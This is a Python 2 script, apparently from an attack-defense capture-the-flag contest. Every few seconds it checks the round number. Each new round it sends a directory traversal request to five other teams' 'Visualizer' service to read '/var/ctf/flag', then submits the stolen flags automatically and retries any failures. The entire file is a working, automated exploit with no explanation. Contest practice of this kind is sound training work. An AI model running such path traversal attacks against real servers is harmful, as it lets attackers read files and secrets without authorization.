import sys
import urllib2
import time
import requests
from submit import send

MYTEAM = 'Team 3'
DST = ['Team 1', 'Team 2', 'Team 4', 'Team 5', 'Team TA']
url = [1, 2, 4, 5, 6]
SERVICE = 'Visualizer'

def check_rnd():
    r = requests.get('http://localhost:3000/')
    rnd = r.text.split('Round : ')[1].split(' </h1>')[0]
    return rnd

def attack_Viz():
    succ = []
    for i in range(5):
        req = urllib2.Request('http://localhost:%d' % (30000 + url[i]) + '/get?page=../../../../../../../../../../var/ctf/flag')
        try:
            r = urllib2.urlopen(req)
            flag = r.read()
        except:
            exit(1)
        if send('Team 3', DST[i], SERVICE, flag):
            succ.append(i)
    return succ

old = 0
while True:
    new = check_rnd()
    if old != new:
        old = new
        print 'rnd : ', new
        print 'attack Vix start'
        succ = attack_Viz()
        numtry = 1
        while len(succ) != 5 and numtry < 5:
            succ = attack_Viz()
            time.sleep(10)
            numtry += 1

        print 'ok at : ',
        for i in succ:
            print DST[i],
        print
    time.sleep(5)
